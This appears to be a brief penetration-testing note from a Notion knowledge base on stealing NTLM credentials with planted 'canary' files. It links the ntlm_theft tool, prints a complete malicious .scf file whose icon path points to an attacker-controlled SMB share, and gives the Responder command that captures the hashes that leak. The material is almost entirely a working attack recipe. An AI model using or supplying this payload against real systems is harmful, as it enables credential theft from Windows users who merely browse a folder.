# responder: Malicious linked/canary files

OS: Linux, Windows
Description: Drop canary files
Security Domains: Credential Access (https://www.notion.so/Credential-Access-1444c8e523768003b6fde866419041dc?pvs=21)
Target_Technology: PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21), Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)

### NTLM Theft Repository

```jsx
https://github.com/Greenwolf/ntlm_theft
```

### Potential File generated. (.scf)

```jsx
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### On Linux Fire Up Responder

```jsx
 sudo responder -wrf -v -I tun0
```